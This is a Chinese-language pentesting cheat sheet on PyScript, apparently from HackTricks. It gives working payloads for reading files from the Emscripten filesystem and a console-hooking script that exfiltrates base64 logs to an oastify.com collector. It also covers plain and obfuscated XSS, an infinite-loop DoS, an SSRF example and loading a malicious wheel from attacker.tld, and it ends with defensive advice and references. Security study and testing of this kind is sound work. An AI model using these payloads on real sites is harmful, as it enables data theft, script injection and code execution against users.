# Pyscript

## PyScript Pentesting 指南

PyScript 是一个用于将 Python 集成到 HTML 中的新框架，因此可以与 HTML 一起使用。在此 cheat sheet 中，你将了解如何将 PyScript 用于 penetration testing。

### 从 Emscripten 虚拟内存文件系统 Dump / Retrieving 文件：

`CVE ID: CVE-2022-30286`.<sup>[[3]](#references)[[7]](#references)</sup>\
\
代码：
```html
<py-script>
with open('/lib/python3.10/site-packages/_pyodide/_base.py', 'r') as fin: out
= fin.read() print(out)
</py-script>
```
结果：

![PyScript Pentesting 指南 - 从 Emscripten 虚拟内存文件系统转储/检索文件：= fin.read() print(out)](https://user-images.githubusercontent.com/66295316/166847974-978c4e23-05fa-402f-884a-38d91329bac3.png)

### [Emscripten 虚拟内存文件系统的 OOB 数据外泄（控制台监控）](https://github.com/s/jcd3T19P0M8QRnU1KRDk/~/changes/Wn2j4r8jnHsV8mBiqPk5/blogs/the-art-of-vulnerability-chaining-pyscript)

`CVE ID: CVE-2022-30286`.<sup>[[3]](#references)[[7]](#references)</sup>\
\
代码：
```html
<py-script>
x = "CyberGuy" if x == "CyberGuy": with
open('/lib/python3.10/asyncio/tasks.py') as output: contents = output.read()
print(contents) print('
<script>
console.pylog = console.log
console.logs = []
console.log = function () {
console.logs.push(Array.from(arguments))
console.pylog.apply(console, arguments)
fetch("http://9hrr8wowgvdxvlel2gtmqbspigo8cx.oastify.com/", {
method: "POST",
headers: { "Content-Type": "text/plain;charset=utf-8" },
body: JSON.stringify({ content: btoa(console.logs) }),
})
}
</script>
')
</py-script>
```
结果：

![从 Emscripten 虚拟内存文件系统转储 / 获取文件 - Emscripten 虚拟内存文件系统的 OOB Data Exfiltration（控制台监控）：Cross Site Scripting...](https://user-images.githubusercontent.com/66295316/166848198-49f71ccb-73cf-476b-b8f3-139e6371c432.png)

### Cross Site Scripting (Ordinary)

代码：
```python
<py-script>
print("<img src=x onerror='alert(document.domain)'>")
</py-script>
```
结果：

![OOB Data Exfiltration of the Emscripten virtual memory filesystem (console monitoring) - Cross Site Scripting (Ordinary): Cross Site Scripting (Python Obfuscated)](https://user-images.githubusercontent.com/66295316/166848393-e835cf6b-992e-4429-ad66-bc54b98de5cf.png)

### Cross Site Scripting (Python Obfuscated)

代码：
```python
<py-script>
sur = "\u0027al";fur = "e";rt = "rt"
p = "\x22x$$\x22\x29\u0027\x3E"
s = "\x28";pic = "\x3Cim";pa = "g";so = "sr"
e = "c\u003d";q = "x"
y = "o";m = "ner";z = "ror\u003d"

print(pic+pa+" "+so+e+q+" "+y+m+z+sur+fur+rt+s+p)
</py-script>
```
Result:

![Cross Site Scripting (Ordinary) - Cross Site Scripting (Python Obfuscated): print(pic+pa+" "+so+e+q+" "+y+m+z+sur+fur+rt+s+p)](https://user-images.githubusercontent.com/66295316/166848370-d981c94a-ee05-42a8-afb8-ccc4fc9f97a0.png)

### Cross Site Scripting (JavaScript Obfuscation)

代码:
```html
<py-script>
prinht(""
<script>
var _0x3675bf = _0x5cf5
function _0x5cf5(_0xced4e9, _0x1ae724) {
var _0x599cad = _0x599c()
return (
(_0x5cf5 = function (_0x5cf5d2, _0x6f919d) {
_0x5cf5d2 = _0x5cf5d2 - 0x94
var _0x14caa7 = _0x599cad[_0x5cf5d2]
return _0x14caa7
}),
_0x5cf5(_0xced4e9, _0x1ae724)
)
}
;(function (_0x5ad362, _0x98a567) {
var _0x459bc5 = _0x5cf5,
_0x454121 = _0x5ad362()
while (!![]) {
try {
var _0x168170 =
(-parseInt(_0x459bc5(0x9e)) / 0x1) *
(parseInt(_0x459bc5(0x95)) / 0x2) +
(parseInt(_0x459bc5(0x97)) / 0x3) *
(-parseInt(_0x459bc5(0x9c)) / 0x4) +
-parseInt(_0x459bc5(0x99)) / 0x5 +
(-parseInt(_0x459bc5(0x9f)) / 0x6) *
(parseInt(_0x459bc5(0x9d)) / 0x7) +
(-parseInt(_0x459bc5(0x9b)) / 0x8) *
(-parseInt(_0x459bc5(0x9a)) / 0x9) +
-parseInt(_0x459bc5(0x94)) / 0xa +
(parseInt(_0x459bc5(0x98)) / 0xb) *
(parseInt(_0x459bc5(0x96)) / 0xc)
if (_0x168170 === _0x98a567) break
else _0x454121["push"](_0x454121["shift"]())
} catch (_0x5baa73) {
_0x454121["push"](_0x454121["shift"]())
}
}
})(_0x599c, 0x28895),
prompt(document[_0x3675bf(0xa0)])
function _0x599c() {
var _0x34a15f = [
"15170376Sgmhnu",
"589203pPKatg",
"11BaafMZ",
"445905MAsUXq",
"432bhVZQo",
"14792bfmdlY",
"4FKyEje",
"92890jvCozd",
"36031bizdfX",
"114QrRNWp",
"domain",
"3249220MUVofX",
"18cpppdr",
]
_0x599c = function () {
return _0x34a15f
}
return _0x599c()
}
</script>
"")
</py-script>
```
Result:

![Cross Site Scripting (Python Obfuscated) - Cross Site Scripting (JavaScript Obfuscation): DoS attack (Infinity loop)](https://user-images.githubusercontent.com/66295316/166848442-2aece7aa-47b5-4ee7-8d1d-0bf981ba57b8.png)

### DoS attack (Infinity loop)

代码：
```html
<py-script>
while True:
print("&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;")
</py-script>
```
结果：

![Cross Site Scripting (JavaScript Obfuscation) - DoS attack (Infinity loop):...](https://user-images.githubusercontent.com/66295316/166848534-3e76b233-a95d-4cab-bb2c-42dbd764fefa.png)

---

## 新漏洞与技术（2023-2025）

### 通过不受控制的重定向实现 Server-Side Request Forgery（CVE-2025-50182）

`urllib3 >= 2.2.0, < 2.5.0` 在与 Pyodide 的浏览器传输一起使用时，会忽略 `redirect` 和 `retries` 请求参数。如果攻击者能够影响目标 URL，即使代码要求 urllib3 禁用重定向，它仍可能跟随跨域重定向，从而削弱 SSRF 防御措施。<sup>[[1]](#references)[[4]](#references)</sup>
```html
<script type="py">
import urllib3
http = urllib3.PoolManager()
r = http.request(
"GET",
"https://evil.example/302",
retries=False,
redirect=False,
)  # ignored by affected Pyodide/browser runtimes
print(r.status, r.url)
</script>
```
将 Node.js 的 `urllib3` 升级到 `>= 2.5.0`，但不要依赖 `urllib3` 在浏览器中禁用重定向；应在发起请求前验证目标，或将目标加入 allow-list。<sup>[[4]](#references)</sup>

### 任意 package 加载与供应链攻击

PyScript 的 Pyodide 配置接受任意 wheel URL 作为 `packages`；如果攻击者能够修改或注入该配置，后续的 import 便可在受害者的浏览器中执行攻击者控制的 Python 代码。<sup>[[5]](#references)[[6]](#references)</sup>
```html
<py-config>
packages = ["https://attacker.tld/payload-0.0.1-py3-none-any.whl"]
</py-config>
<script type="py">
import payload  # executes attacker-controlled code at import
</script>
```
Pyodide 可以从任意 URL 安装 pure-Python wheels，而无需对该 package 进行 WebAssembly 构建。<sup>[[6]](#references)</sup> 请确保此配置由开发者控制，仅允许 exact package names 或 URLs，并在构建或部署期间验证远程 wheel 的 digest。

### Output sanitisation changes (2023+)

* 在 legacy examples 使用的 2022.05.1 implementation 中，`print()` 写入 `text/plain` output 时不会进行 HTML escaping，因此容易受到 XSS 攻击。<sup>[[8]](#references)</sup>
* 当前的 `display()` helper 默认会对 plain strings 进行 **HTML escaping**；原始 markup 必须使用 `pyscript.HTML()` 包装。<sup>[[2]](#references)</sup>
```python
from pyscript import display, HTML

display("<b>escaped</b>")          # renders literally

display(HTML("<b>not-escaped</b>")) # executes as HTML -> potential XSS if untrusted
```
对不可信输入使用 `display()`，不要将不可信字符串传递给 `HTML()`。<sup>[[2]](#references)</sup>

---

## 防御最佳实践

* **保持 packages 为最新版本** – 在 Node.js 中使用 `urllib3 >= 2.5.0`，并单独审查浏览器重定向假设。<sup>[[4]](#references)</sup>
* **限制 package 来源** – 将 PyPI 名称或确切的受信任 URL 加入 allow-list，并在构建或部署期间验证远程 wheel 的摘要。<sup>[[5]](#references)[[6]](#references)</sup>
* **强化 Content Security Policy** – 禁止 inline JavaScript（`script-src 'self' 'sha256-…'`），以防止注入的 `<script>` 块执行。
* **禁止用户提供 `<py-script>` / `<script type="py">` 标签** – 在将 HTML 回显给其他用户之前，在服务器上对其进行 sanitise。
* **隔离 worker** – 如果不需要从 worker 同步访问 DOM，请启用 `sync_main_only` flag，以避免使用 `SharedArrayBuffer` 及其相关的 CORS header 要求。<sup>[[5]](#references)</sup>

## References

- [1] [NVD – CVE-2025-50182](https://nvd.nist.gov/vuln/detail/CVE-2025-50182)
- [2] [PyScript Built-ins 文档 – `display` 与 `HTML`](https://docs.pyscript.net/2024.6.1/user-guide/builtins/)
- [3] [Cyber Guy - Vulnerability Chaining 艺术（PyScript）](https://cyber-guy.gitbook.io/cyber-guy/blogs/the-art-of-vulnerability-chaining-pyscript)
- [4] [urllib3 security advisory – CVE-2025-50182](https://github.com/urllib3/urllib3/security/advisories/GHSA-48p4-8xcf-vxj5)
- [5] [PyScript 配置文档 – packages 与 `sync_main_only`](https://docs.pyscript.net/2026.7.3/user-guide/configuration/)
- [6] [Pyodide – 加载 packages](https://pyodide.org/en/stable/usage/loading-packages.html)
- [7] [NVD – CVE-2022-30286](https://nvd.nist.gov/vuln/detail/CVE-2022-30286)
- [8] [PyScript 2022.05.1 `pyscript.py` 实现](https://github.com/pyscript/pyscript/blob/2022.05.1/pyscriptjs/src/pyscript.py)
{{#include ../../banners/hacktricks-training.md}}
